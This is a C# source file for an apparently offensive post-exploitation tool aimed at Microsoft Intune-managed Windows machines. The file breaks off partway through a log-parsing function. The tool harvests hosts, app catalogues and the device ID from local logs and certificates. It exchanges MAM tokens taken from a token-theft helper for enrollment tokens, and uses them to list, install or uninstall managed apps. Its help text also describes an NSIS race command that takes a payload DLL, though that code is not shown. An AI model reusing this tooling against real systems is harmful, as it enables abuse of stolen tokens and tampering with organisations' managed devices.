using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace CompanyPortalRecon
{
    // WCF contracts for the IME StatusService named pipe
    static class ImeNs
    {
        public const string Dc = "http://schemas.datacontract.org/2004/07/"
            + "Microsoft.Management.Clients.IntuneManagementExtension.StatusServiceLibrary";
    }

    [ServiceContract(SessionMode = SessionMode.Required,
        CallbackContract = typeof(IStatusServiceCallback))]
    interface IStatusService
    {
        [OperationContract]
        System.Threading.Tasks.Task CheckInAsync(Guid checkInGuid);
    }

    interface IStatusServiceCallback
    {
        [OperationContract(IsOneWay = true)]
        void SyncComplete(ImeSyncResult result);

        [OperationContract(IsOneWay = true)]
        void AppStatusUpdate(ImeAppStatusReport report);

        [OperationContract(IsOneWay = true)]
        void DownloadProgressUpdate(ImeDownloadReport report);
    }

    [DataContract(Name = "SyncResult", Namespace = ImeNs.Dc)]
    class ImeSyncResult
    {
        [DataMember] public Guid SessionId { get; set; }
        [DataMember] public bool Success { get; set; }
        [DataMember] public int ErrorCode { get; set; }
    }

    [DataContract(Name = "AppInstallStatusReport", Namespace = ImeNs.Dc)]
    class ImeAppStatusReport
    {
        [DataMember] public Guid AppId { get; set; }
        [DataMember] public int Status { get; set; }
        [DataMember] public int ErrorCode { get; set; }
    }

    [DataContract(Name = "DownloadProgressReport", Namespace = ImeNs.Dc)]
    class ImeDownloadReport
    {
        [DataMember] public Guid AppId { get; set; }
        [DataMember] public long BytesDownloaded { get; set; }
        [DataMember] public long TotalSizeInBytes { get; set; }
    }

    [CallbackBehavior(ConcurrencyMode = ConcurrencyMode.Multiple,
        UseSynchronizationContext = false)]
    class ImeCallback : IStatusServiceCallback
    {
        public ManualResetEvent SyncDone = new ManualResetEvent(false);
        public bool? SyncSuccess;

        public void SyncComplete(ImeSyncResult result)
        {
            if (result != null)
            {
                SyncSuccess = result.Success;
                Console.WriteLine("[*] IME sync complete (success=" + result.Success + ")");
            }
            else
            {
                Console.WriteLine("[*] IME sync complete (null result)");
            }
            SyncDone.Set();
        }

        public void AppStatusUpdate(ImeAppStatusReport report) { }
        public void DownloadProgressUpdate(ImeDownloadReport report) { }
    }

    class Program
    {
        const string ImePipeEndpoint =
            "net.pipe://localhost/IntuneManagementExtension/StatusService/";
        static int Main(string[] args)
        {
            if (args.Length == 0) { PrintHelp(); return 0; }

            string cmd = args[0].ToLower();
            string[] rest = args.Skip(1).ToArray();

            switch (cmd)
            {
                case "list": return CmdList();
                case "race": return CmdRace(rest);
                case "exchange": return CmdExchange(rest);
                case "apps": return CmdApps(rest);
                case "status": return CmdStatus(rest);
                case "install": return CmdInstallUninstall(rest, "Install");
                case "uninstall": return CmdInstallUninstall(rest, "Uninstall");
                case "checkin": return CmdCheckIn();
                case "help": PrintHelp(); return 0;
                default:
                    Console.WriteLine("Unknown command: " + cmd);
                    PrintHelp();
                    return 1;
            }
        }

        static void PrintHelp()
        {
            Console.WriteLine("CompanyPortalRecon - Intune app enumeration, NSIS race, app management");
            Console.WriteLine();
            Console.WriteLine("Local recon:");
            Console.WriteLine("  list                                 Enumerate apps from IME logs");
            Console.WriteLine("  race <payload_dll> --token <tok> --app <guid>  NSIS race + auto-install");
            Console.WriteLine();
            Console.WriteLine("API operations (requires tokens from askWAM BOF):");
            Console.WriteLine("  exchange --mam-token <token> [--host <fef_host>]");
            Console.WriteLine("           Exchange MAM token for enrollment token");
            Console.WriteLine();
            Console.WriteLine("  apps --token <enrollment_token> [--host <fef_host>] [--installed]");
            Console.WriteLine("           List apps from IWService API (--installed adds install status)");
            Console.WriteLine();
            Console.WriteLine("  status --token <token> [--host <fef_host>] <app_guid>");
            Console.WriteLine("           Show detailed status and available actions for one app");
            Console.WriteLine();
            Console.WriteLine("  install --token <token> [--host <fef_host>] [--checkin] <app_guid>");
            Console.WriteLine("  uninstall --token <token> [--host <fef_host>] [--checkin] <app_guid>");
            Console.WriteLine("           Install or uninstall an app (--checkin forces IME sync after)");
            Console.WriteLine();
            Console.WriteLine("  checkin  Force IME service sync via named pipe");
            Console.WriteLine();
            Console.WriteLine("Token workflow:");
            Console.WriteLine("  1. askwam --client-id 9ba1a5c7-... --resource d4ebce55-...");
            Console.WriteLine("  2. exchange --mam-token <mam_token>");
            Console.WriteLine("  3. apps --token <enrollment_token>");
            Console.WriteLine("  4. install/uninstall --token <enrollment_token> <guid>");
            Console.WriteLine();
            Console.WriteLine("If --host is omitted, it's read from IME logs on disk.");
        }

        // ----------------------------------------------------------------
        // Shared: parse args
        // ----------------------------------------------------------------

        static string ParseArg(string[] args, string name)
        {
            for (int i = 0; i < args.Length - 1; i++)
                if (args[i].Equals(name, StringComparison.OrdinalIgnoreCase))
                    return args[i + 1];
            return null;
        }

        static string ParsePositional(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].StartsWith("--") && i + 1 < args.Length) { i++; continue; }
                if (!args[i].StartsWith("--")) return args[i];
            }
            return null;
        }

        // ----------------------------------------------------------------
        // Shared: discover IWService host from IME logs
        // ----------------------------------------------------------------

        static readonly string ImeLogDir =
            @"C:\ProgramData\Microsoft\IntuneManagementExtension\Logs";

        static string DiscoverHost()
        {
            if (!Directory.Exists(ImeLogDir)) return null;
            try
            {
                var rx = new Regex(@"fef\.[a-z0-9]+\.manage\.microsoft\.com", RegexOptions.IgnoreCase);
                foreach (var f in Directory.GetFiles(ImeLogDir, "*.log"))
                {
                    try
                    {
                        using (var fs = new FileStream(f, FileMode.Open, FileAccess.Read,
                            FileShare.ReadWrite | FileShare.Delete))
                        using (var sr = new StreamReader(fs))
                        {
                            string text = sr.ReadToEnd();
                            var m = rx.Match(text);
                            if (m.Success) return m.Value;
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        // ----------------------------------------------------------------
        // Shared: discover Intune device ID from MDM enrollment cert
        // ----------------------------------------------------------------

        static string DiscoverDeviceId()
        {
            try
            {
                using (var store = new X509Store(StoreName.My, StoreLocation.LocalMachine))
                {
                    store.Open(OpenFlags.ReadOnly);
                    foreach (var cert in store.Certificates)
                    {
                        if (cert.Issuer.IndexOf("Microsoft Intune MDM Device CA",
                            StringComparison.OrdinalIgnoreCase) >= 0)
                        {
                            string cn = cert.GetNameInfo(X509NameType.SimpleName, false);
                            Guid g;
                            if (!string.IsNullOrEmpty(cn) && Guid.TryParse(cn, out g))
                                return g.ToString();
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        // ----------------------------------------------------------------
        // Shared: HTTP helpers using HttpWebRequest (no extra deps)
        // ----------------------------------------------------------------

        static readonly string ServiceParams =
            "api-version=18.14&ssp=WindowsUCP&ssp-version=11.2.2044.0" +
            "&os=Windows&os-version=10.0.26200&os-sub=None&arch=x64&mgmt-agent=MicrosoftManagementPlatformCloudMdm";

        static string HttpGet(string url, string token, bool fullMetadata = false)
        {
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "GET";
            req.Headers["Authorization"] = "Bearer " + token;
            req.Accept = fullMetadata
                ? "application/json; odata=fullmetadata"
                : "application/json";
            req.Headers["Accept-Language"] = "en-US";
            req.Headers["client-request-id"] = Guid.NewGuid().ToString();

            return ReadResponse(req);
        }

        static string HttpPost(string url, string token, string body = "")
        {
            var req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.Headers["Authorization"] = "Bearer " + token;
            req.ContentType = "application/json";
            req.Headers["Accept-Language"] = "en-US";
            req.Headers["client-request-id"] = Guid.NewGuid().ToString();

            byte[] data = Encoding.UTF8.GetBytes(body ?? "");
            req.ContentLength = data.Length;
            using (var s = req.GetRequestStream())
                s.Write(data, 0, data.Length);

            return ReadResponse(req);
        }

        static string ReadResponse(HttpWebRequest req)
        {
            try
            {
                using (var resp = (HttpWebResponse)req.GetResponse())
                using (var sr = new StreamReader(resp.GetResponseStream()))
                    return sr.ReadToEnd();
            }
            catch (WebException wex) when (wex.Response != null)
            {
                using (var sr = new StreamReader(wex.Response.GetResponseStream()))
                {
                    string body = sr.ReadToEnd();
                    int code = (int)((HttpWebResponse)wex.Response).StatusCode;
                    throw new Exception("HTTP " + code + ": " + Truncate(body, 500));
                }
            }
        }

        static string Truncate(string s, int max)
        {
            return s != null && s.Length > max ? s.Substring(0, max) + "..." : s;
        }

        static string BuildUrl(string baseUrl, string deviceId)
        {
            string sep = baseUrl.Contains("?") ? "&" : "?";
            string url = baseUrl + sep + ServiceParams;
            if (!string.IsNullOrEmpty(deviceId))
                url += "&device-id=" + deviceId;
            return url;
        }

        // ----------------------------------------------------------------
        // EXCHANGE - MAM token -> enrollment token via TokenRenewalService
        // ----------------------------------------------------------------

        static int CmdExchange(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string mamToken = ParseArg(args, "--mam-token");
            string intuneToken = ParseArg(args, "--intune-token");

            if (string.IsNullOrEmpty(mamToken))
            {
                Console.WriteLine("Usage: exchange --mam-token <mam_token> [--intune-token <token>] [--host <fef_host>]");
                Console.WriteLine();
                Console.WriteLine("  --mam-token     MAM token (resource d4ebce55-...)");
                Console.WriteLine("  --intune-token  Intune token (resource 0000000a-...) for service discovery");
                Console.WriteLine("  --host          IWService host (auto-discovered from logs or Intune API)");
                return 1;
            }

            string host = ParseArg(args, "--host");

            // Try auto-discovery from IME logs first
            if (string.IsNullOrEmpty(host))
            {
                host = DiscoverHost();
                if (!string.IsNullOrEmpty(host))
                    Console.WriteLine("[*] Discovered host from logs: " + host);
            }

            // If we have an Intune token, try service discovery API
            string tokenRenewalUrl = null;
            string iwServiceUrl = null;

            if (!string.IsNullOrEmpty(intuneToken))
            {
                Console.WriteLine("[*] Discovering service endpoints via Intune API...");
                try
                {
                    string discoverUrl =
                        "https://manage.microsoft.com/RestUserAuthLocationService/" +
                        "RestUserAuthLocationService/Certificate/ServiceAddresses";
                    string json = HttpGet(discoverUrl, intuneToken);
                    Console.WriteLine("[*] Service discovery response (" + json.Length + " chars)");

                    // Try to find TokenRenewalService and IWService URLs
                    string trs = FindServiceUrl(json, "TokenRenewalService");
                    string iws = FindServiceUrl(json, "IWService");

                    if (!string.IsNullOrEmpty(trs))
                    {
                        tokenRenewalUrl = trs;
                        Console.WriteLine("[*] TokenRenewalService: " + trs);
                    }
                    if (!string.IsNullOrEmpty(iws))
                    {
                        iwServiceUrl = iws;
                        Console.WriteLine("[*] IWService: " + iws);
                        if (string.IsNullOrEmpty(host))
                        {
                            var m = Regex.Match(iws, @"https?://([^/]+)");
                            if (m.Success) host = m.Groups[1].Value;
                        }
                    }

                    if (string.IsNullOrEmpty(trs) && string.IsNullOrEmpty(iws))
                        Console.WriteLine("[*] No matching endpoints found. Raw: " +
                            Truncate(json, 500));
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Service discovery failed: " + ex.Message);
                }
            }

            if (string.IsNullOrEmpty(host))
            {
                Console.WriteLine("[-] Could not find service endpoint. Use --host or --intune-token.");
                return 1;
            }

            // Try discovered URL first, then known URL pattern from Company Portal logs
            var candidates = new List<string>();
            if (!string.IsNullOrEmpty(tokenRenewalUrl))
                candidates.Add(tokenRenewalUrl);

            candidates.Add("https://" + host + "/OAuth/StatelessOAuthService/OAuthProxy/");

            // Try each candidate with GET and POST
            foreach (string candidate in candidates)
            {
                string renewUrl = candidate +
                    (candidate.Contains("?") ? "&" : "?") + "api-version=1.0";

                Console.WriteLine("[*] GET " + renewUrl);

                try
                {
                    string json2 = HttpGet(renewUrl, mamToken);
                    string token = JsonGetPath(json2, "Result", "Token");

                    if (!string.IsNullOrEmpty(token))
                    {
                        Console.WriteLine("[+] Got enrollment token (" + token.Length + " chars):");
                        Console.WriteLine(token);
                        return 0;
                    }

                    Console.WriteLine("[!] 2xx but no token: " + Truncate(json2, 200));
                }
                catch (Exception ex)
                {
                    string msg = ex.Message;
                    if (msg.Length > 120) msg = msg.Substring(0, 120) + "...";
                    Console.WriteLine("[!] " + msg);
                }
            }

            Console.WriteLine();
            Console.WriteLine("[-] All patterns failed. Try passing --intune-token for service discovery,");
            Console.WriteLine("    or check if the MAM token is still valid (they expire quickly).");
            return 1;
        }

        static string FindServiceUrl(string json, string serviceName)
        {
            int idx = json.IndexOf(serviceName, StringComparison.OrdinalIgnoreCase);
            while (idx >= 0)
            {
                int urlIdx = json.IndexOf("https://", idx, Math.Min(500, json.Length - idx),
                    StringComparison.OrdinalIgnoreCase);
                if (urlIdx >= 0 && urlIdx - idx < 500)
                {
                    int end = urlIdx;
                    while (end < json.Length && json[end] != '"' && json[end] != ' ' &&
                           json[end] != '<' && json[end] != '\n' && json[end] != '\r')
                        end++;
                    string url = json.Substring(urlIdx, end - urlIdx).TrimEnd('/');
                    if (url.Contains("manage.microsoft.com"))
                        return url;
                }
                idx = json.IndexOf(serviceName, idx + serviceName.Length, StringComparison.OrdinalIgnoreCase);
            }
            return null;
        }

        // ----------------------------------------------------------------
        // APPS - list apps from IWService API
        // ----------------------------------------------------------------

        static int CmdApps(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string token = ParseArg(args, "--token");
            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("Usage: apps --token <enrollment_token> [--host <fef_host>] [--installed]");
                return 1;
            }

            bool showInstalled = args.Any(a => a.Equals("--installed", StringComparison.OrdinalIgnoreCase));

            string host = ParseArg(args, "--host");
            if (string.IsNullOrEmpty(host))
            {
                host = DiscoverHost();
                if (string.IsNullOrEmpty(host))
                {
                    Console.WriteLine("[-] Could not find IWService host. Use --host.");
                    return 1;
                }
                Console.WriteLine("[*] Discovered host: " + host);
            }

            string deviceId = DiscoverDeviceId();
            if (!string.IsNullOrEmpty(deviceId))
                Console.WriteLine("[*] Device ID: " + deviceId);

            string iwUrl = "https://" + host + "/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService";
            string baseUrl = iwUrl + "/Applications?$top=100";
            string url = BuildUrl(baseUrl, deviceId);

            Console.WriteLine("[*] Listing apps...");

            try
            {
                string json = HttpGet(url, token, fullMetadata: true);
                var apps = JsonGetArray(json, "value");

                // If --installed, fetch all device ApplicationState in one request
                var stateMap = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                if (showInstalled && !string.IsNullOrEmpty(deviceId))
                {
                    Console.WriteLine("[*] Fetching install status...");
                    try
                    {
                        string stateUrl = iwUrl + "/Devices(guid'" + deviceId + "')/ApplicationState";
                        stateUrl = BuildUrl(stateUrl, deviceId);
                        string stateJson = HttpGet(stateUrl, token);
                        var states = JsonGetArray(stateJson, "value");
                        foreach (var state in states)
                        {
                            string appId = JsonGetString(state, "ApplicationId");
                            string status = JsonGetString(state, "CombinedStatus") ?? "";
                            if (!string.IsNullOrEmpty(appId))
                                stateMap[appId] = status;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[!] Could not fetch status: " + ex.Message);
                    }
                }

                Console.WriteLine();
                if (showInstalled)
                {
                    Console.WriteLine("  {0,-3} {1,-38} {2,-10} {3,-16} {4,-25} {5}",
                        "#", "AppId", "Intent", "Status", "Name", "Publisher");
                    Console.WriteLine("  " + new string('-', 120));
                }
                else
                {
                    Console.WriteLine("  {0,-3} {1,-38} {2,-10} {3,-30} {4}",
                        "#", "AppId", "Intent", "Name", "Publisher");
                    Console.WriteLine("  " + new string('-', 105));
                }

                int i = 0;
                foreach (var app in apps)
                {
                    i++;
                    string name = JsonGetString(app, "Name") ?? "?";
                    string guid = JsonGetString(app, "GuidKey") ?? "?";
                    string pub = JsonGetString(app, "Publisher") ?? "";
                    int intentVal = JsonGetInt(app, "Intent");
                    string intent = "?";
                    if (intentVal == 1) intent = "Available";
                    else if (intentVal == 2) intent = "Required";
                    else if (intentVal == 3) intent = "Uninstall";
                    else if (intentVal == 0) intent = "None";

                    if (showInstalled)
                    {
                        string status = "";
                        stateMap.TryGetValue(guid, out status);
                        if (status == null) status = "";
                        if (name.Length > 23) name = name.Substring(0, 20) + "...";
                        Console.WriteLine("  {0,-3} {1,-38} {2,-10} {3,-16} {4,-25} {5}",
                            i, guid, intent, status, name, pub);
                    }
                    else
                    {
                        if (name.Length > 28) name = name.Substring(0, 25) + "...";
                        Console.WriteLine("  {0,-3} {1,-38} {2,-10} {3,-30} {4}",
                            i, guid, intent, name, pub);
                    }
                }

                Console.WriteLine();
                Console.WriteLine("[*] " + i + " app(s)");
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] List failed: " + ex.Message);
                return 1;
            }
        }

        // ----------------------------------------------------------------
        // STATUS - show detail and available actions for one app
        // ----------------------------------------------------------------

        static int CmdStatus(string[] args)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string token = ParseArg(args, "--token");
            string appGuid = ParsePositional(args);

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(appGuid))
            {
                Console.WriteLine("Usage: status --token <enrollment_token> [--host <fef_host>] <app_guid>");
                return 1;
            }

            string host = ParseArg(args, "--host");
            if (string.IsNullOrEmpty(host))
            {
                host = DiscoverHost();
                if (string.IsNullOrEmpty(host))
                {
                    Console.WriteLine("[-] Could not find IWService host. Use --host.");
                    return 1;
                }
                Console.WriteLine("[*] Discovered host: " + host);
            }

            string deviceId = DiscoverDeviceId();
            if (!string.IsNullOrEmpty(deviceId))
                Console.WriteLine("[*] Device ID: " + deviceId);

            string iwUrl = "https://" + host + "/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService";

            // Get app metadata
            Console.WriteLine("[*] Fetching app info for " + appGuid + "...");
            try
            {
                string appsUrl = iwUrl + "/Applications?$top=100";
                appsUrl = BuildUrl(appsUrl, deviceId);
                string appsJson = HttpGet(appsUrl, token, fullMetadata: true);
                var apps = JsonGetArray(appsJson, "value");

                string appName = null;
                string appPub = null;
                int appIntent = -1;
                foreach (var app in apps)
                {
                    string gk = JsonGetString(app, "GuidKey");
                    if (string.Equals(gk, appGuid, StringComparison.OrdinalIgnoreCase))
                    {
                        appName = JsonGetString(app, "Name");
                        appPub = JsonGetString(app, "Publisher");
                        appIntent = JsonGetInt(app, "Intent");
                        break;
                    }
                }

                if (appName == null)
                {
                    Console.WriteLine("[-] App not found: " + appGuid);
                    return 1;
                }

                string intentLabel = "?";
                if (appIntent == 1) intentLabel = "Available";
                else if (appIntent == 2) intentLabel = "Required";
                else if (appIntent == 3) intentLabel = "Uninstall";
                else if (appIntent == 0) intentLabel = "None";

                Console.WriteLine("[*] Name:      " + appName);
                Console.WriteLine("[*] Publisher:  " + appPub);
                Console.WriteLine("[*] Intent:     " + intentLabel);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Could not fetch app info: " + ex.Message);
            }

            // Get ApplicationState
            Console.WriteLine("[*] Fetching install status...");
            try
            {
                string stateUrl = iwUrl + "/Applications(GuidKey=guid'" + appGuid +
                    "',StringKey='')/ApplicationState";
                if (!string.IsNullOrEmpty(deviceId))
                    stateUrl += "?$filter=DeviceId%20eq%20guid'" + deviceId + "'";
                stateUrl = BuildUrl(stateUrl, deviceId);

                string stateJson = HttpGet(stateUrl, token, fullMetadata: true);
                var states = JsonGetArray(stateJson, "value");

                if (states.Count == 0)
                {
                    Console.WriteLine("[*] Status:     No state (not targeted to this device)");
                }
                else
                {
                    foreach (var state in states)
                    {
                        string status = JsonGetString(state, "CombinedStatus") ?? "Unknown";
                        Console.WriteLine("[*] Status:     " + status);

                        bool hasInstall = FindODataAction(state, "Install") != null;
                        bool hasUninstall = FindODataAction(state, "Uninstall") != null;

                        Console.Write("[*] Actions:    ");
                        if (hasInstall && hasUninstall) Console.WriteLine("Install, Uninstall");
                        else if (hasInstall) Console.WriteLine("Install");
                        else if (hasUninstall) Console.WriteLine("Uninstall");
                        else Console.WriteLine("(none)");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Could not fetch status: " + ex.Message);
            }

            return 0;
        }

        // ----------------------------------------------------------------
        // INSTALL / UNINSTALL - trigger app action via OData action target
        // ----------------------------------------------------------------

        static int CmdInstallUninstall(string[] args, string action)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string token = ParseArg(args, "--token");
            string appGuid = ParsePositional(args);
            bool doCheckin = args.Any(a => a.Equals("--checkin", StringComparison.OrdinalIgnoreCase));

            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(appGuid))
            {
                Console.WriteLine("Usage: " + action.ToLower() +
                    " --token <enrollment_token> [--host <fef_host>] [--checkin] <app_guid>");
                return 1;
            }

            string host = ParseArg(args, "--host");
            if (string.IsNullOrEmpty(host))
            {
                host = DiscoverHost();
                if (string.IsNullOrEmpty(host))
                {
                    Console.WriteLine("[-] Could not find IWService host. Use --host.");
                    return 1;
                }
                Console.WriteLine("[*] Discovered host: " + host);
            }

            string deviceId = DiscoverDeviceId();
            if (!string.IsNullOrEmpty(deviceId))
                Console.WriteLine("[*] Device ID: " + deviceId);

            bool ok = TriggerAppAction(host, token, deviceId, appGuid, action);

            if (ok && doCheckin)
                TriggerCheckIn();

            return ok ? 0 : 1;
        }

        static string GetNavLink(string iwUrl, string token, string deviceId, string appGuid)
        {
            string baseUrl = iwUrl + "/Applications?$top=100";
            string url = BuildUrl(baseUrl, deviceId);

            try
            {
                string json = HttpGet(url, token, fullMetadata: true);
                var apps = JsonGetArray(json, "value");

                foreach (var app in apps)
                {
                    string gk = JsonGetString(app, "GuidKey");
                    if (string.Equals(gk, appGuid, StringComparison.OrdinalIgnoreCase))
                        return JsonGetString(app, "ApplicationState@odata.navigationLinkUrl");
                }
            }
            catch { }
            return null;
        }

        static string FindODataAction(string json, string actionName)
        {
            // OData fullmetadata includes action targets like:
            // "#CommonContainer.Install":{"target":"https://..."}
            // "#CommonContainer.Uninstall":{"target":"https://..."}
            string pattern = "\"#CommonContainer." + actionName + "\"";
            int idx = json.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
            if (idx < 0)
            {
                // Fallback: bare action name
                pattern = "\"#" + actionName + "\"";
                idx = json.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
            }
            if (idx < 0) return null;

            int targetIdx = json.IndexOf("\"target\"", idx, StringComparison.OrdinalIgnoreCase);
            if (targetIdx < 0 || targetIdx - idx > 200) return null;

            return ExtractJsonString(json, targetIdx + 8);
        }

        // ----------------------------------------------------------------
        // Minimal JSON helpers (no System.Text.Json in net462)
        // ----------------------------------------------------------------

        static string JsonGetString(string json, string key)
        {
            string pattern = "\"" + key + "\"";
            int idx = json.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return null;

            int afterKey = idx + pattern.Length;
            int colonOrQuote = afterKey;
            while (colonOrQuote < json.Length &&
                   (json[colonOrQuote] == ' ' || json[colonOrQuote] == ':' ||
                    json[colonOrQuote] == '\t' || json[colonOrQuote] == '\n' ||
                    json[colonOrQuote] == '\r'))
                colonOrQuote++;

            if (colonOrQuote >= json.Length) return null;
            if (json[colonOrQuote] == '"')
                return ExtractQuoted(json, colonOrQuote);
            return null;
        }

        static int JsonGetInt(string json, string key, int defaultVal = -1)
        {
            string pattern = "\"" + key + "\"";
            int idx = json.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return defaultVal;

            int afterKey = idx + pattern.Length;
            int pos = afterKey;
            while (pos < json.Length && (json[pos] == ' ' || json[pos] == ':' ||
                   json[pos] == '\t' || json[pos] == '\n' || json[pos] == '\r'))
                pos++;

            if (pos >= json.Length) return defaultVal;

            // Read digits (possibly with leading minus)
            int start = pos;
            if (pos < json.Length && json[pos] == '-') pos++;
            while (pos < json.Length && json[pos] >= '0' && json[pos] <= '9') pos++;

            if (pos == start) return defaultVal;
            int val;
            if (int.TryParse(json.Substring(start, pos - start), out val))
                return val;
            return defaultVal;
        }

        static string JsonGetPath(string json, params string[] keys)
        {
            string current = json;
            for (int i = 0; i < keys.Length; i++)
            {
                string pattern = "\"" + keys[i] + "\"";
                int idx = current.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
                if (idx < 0) return null;
                current = current.Substring(idx);
            }
            string last = keys[keys.Length - 1];
            return JsonGetString(current, last);
        }

        static List<string> JsonGetArray(string json, string key)
        {
            var result = new List<string>();
            string pattern = "\"" + key + "\"";
            int idx = json.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return result;

            int bracket = json.IndexOf('[', idx + pattern.Length);
            if (bracket < 0) return result;

            int pos = bracket + 1;
            while (pos < json.Length)
            {
                while (pos < json.Length && json[pos] != '{' && json[pos] != ']') pos++;
                if (pos >= json.Length || json[pos] == ']') break;

                int objStart = pos;
                int depth = 0;
                while (pos < json.Length)
                {
                    char c = json[pos];
                    if (c == '{') depth++;
                    else if (c == '}') { depth--; if (depth == 0) { pos++; break; } }
                    else if (c == '"') { pos++; while (pos < json.Length && json[pos] != '"') { if (json[pos] == '\\') pos++; pos++; } }
                    pos++;
                }

                result.Add(json.Substring(objStart, pos - objStart));
            }

            return result;
        }

        static string ExtractQuoted(string json, int quotePos)
        {
            if (quotePos >= json.Length || json[quotePos] != '"') return null;
            var sb = new StringBuilder();
            int i = quotePos + 1;
            while (i < json.Length)
            {
                char c = json[i];
                if (c == '"') break;
                if (c == '\\' && i + 1 < json.Length)
                {
                    i++;
                    c = json[i];
                    if (c == 'n') sb.Append('\n');
                    else if (c == 't') sb.Append('\t');
                    else if (c == 'u' && i + 4 < json.Length)
                    {
                        string hex = json.Substring(i + 1, 4);
                        int val;
                        if (int.TryParse(hex, System.Globalization.NumberStyles.HexNumber, null, out val))
                            sb.Append((char)val);
                        i += 4;
                    }
                    else sb.Append(c);
                }
                else
                {
                    sb.Append(c);
                }
                i++;
            }
            return sb.ToString();
        }

        // Keep old ExtractJsonString for list command compatibility
        static string ExtractJsonString(string json, int afterQuote)
        {
            int openQuote = json.IndexOf('"', afterQuote);
            if (openQuote < 0 || openQuote > afterQuote + 3) return null;
            return ExtractQuoted(json, openQuote);
        }

        // ----------------------------------------------------------------
        // LIST - parse IME logs for app catalog (JSON in "Get policies" lines)
        // ----------------------------------------------------------------

        class AppInfo
        {
            public string Id;
            public string Name;
            public string InstallCmd;
            public string SetupFile;
        }

        static int CmdList()
        {
            if (!Directory.Exists(ImeLogDir))
            {
                Console.WriteLine("[-] IME log directory not found: " + ImeLogDir);
                return 1;
            }

            var apps = new Dictionary<string, AppInfo>(StringComparer.OrdinalIgnoreCase);
            int filesRead = 0;

            string[] logFiles;
            try { logFiles = Directory.GetFiles(ImeLogDir, "*.log"); }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Cannot read log dir: " + ex.Message);
                return 1;
            }

            foreach (string logFile in logFiles)
            {
                try
                {
                    ParseLogFile(logFile, apps);
                    filesRead++;
                }
                catch { }
            }

            Console.WriteLine("[*] Parsed " + filesRead + " log file(s) from " + ImeLogDir);

            if (apps.Count == 0)
            {
                Console.WriteLine("[-] No Win32 apps found in logs.");
                return 1;
            }

            Console.WriteLine("[*] " + apps.Count + " unique app(s):\n");
            Console.WriteLine("  {0,-4}{1,-42}{2,-8}{3}",
                "#", "Name", "Type", "InstallCmd");
            Console.WriteLine("  " + new string('-', 100));

            int i = 0;
            foreach (var kv in apps.OrderBy(x => x.Value.Name.ToLower()))
            {
                i++;
                var a = kv.Value;
                string cmd = a.InstallCmd ?? "";
                string cl = cmd.ToLower();
                string t = "";
                if (cl.Contains(".msi")) t = "msi";
                else if (cl.Contains(".ps1") || cl.Contains("powershell")) t = "ps1";
                else if (cl.TrimEnd().EndsWith("/s") || cl.Contains("/s ")) t = "EXE/S";
                else if (cl.Contains(".exe")) t = "exe";
                else if (cl.Contains(".cmd")) t = "cmd";

                string displayCmd = cmd.Length > 55 ? cmd.Substring(0, 52) + "..." : cmd;
                string displayName = a.Name.Length > 40 ? a.Name.Substring(0, 37) + "..." : a.Name;

                Console.WriteLine("  {0,-4}{1,-42}{2,-8}{3}",
                    i, displayName, t, displayCmd);
            }

            Console.WriteLine();
            Console.WriteLine("[*] Cross-reference names with nsis_lookup.py for NSIS version/CVE info.");
            return 0;
        }

        static void ParseLogFile(string path, Dictionary<string, AppInfo> apps)
        {
            string text;
            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete))
            using (var sr = new StreamReader(fs))
                text = sr.ReadToEnd();

            int pos = 0;
            while (pos < text.Length)
            {
                int logStart = text.IndexOf("<![LOG[", pos);
                if (logStart < 0) break;
                logStart += 7;

                int logEnd = text.IndexOf("]LOG]!>", logStart);
                if (logEnd < 0) break;

                string msg = text.Substring(logStart, logEnd - logStart);
                pos = logEnd + 7;

                int policyIdx = msg.IndexOf("Get policies", StringComparison.OrdinalIgnoreCase);
                if (policyIdx < 0) continue;

                int bracket = msg.IndexOf('[', policyIdx);
                if (bracket < 0) continue;

                string jsonStr = msg.Substring(bracket);
                ParsePolicyJson(jsonStr, apps);
            }
        }

        static void ParsePolicyJson(string json, Dictionary<string, AppInfo> apps)
        {
            int pos = 0;
            while (pos < json.Length)
            {
                int idIdx = json.IndexOf("\"Id\":\"", pos, StringComparison.OrdinalIgnoreCase);
                if (idIdx < 0) break;

                string id = ExtractJsonString(json, idIdx + 5);
                if (string.IsNullOrEmpty(id) || id.Length < 30)
                {
                    pos = idIdx + 6;
                    continue;
                }

                string name = null;
                string installCmd = null;
                string setupFile = null;

                int searchEnd = Math.Min(json.Length, idIdx + 5000);

                int nameIdx = json.IndexOf("\"Name\":\"", idIdx, searchEnd - idIdx, StringComparison.OrdinalIgnoreCase);
                if (nameIdx >= 0)
                    name = ExtractJsonString(json, nameIdx + 7);

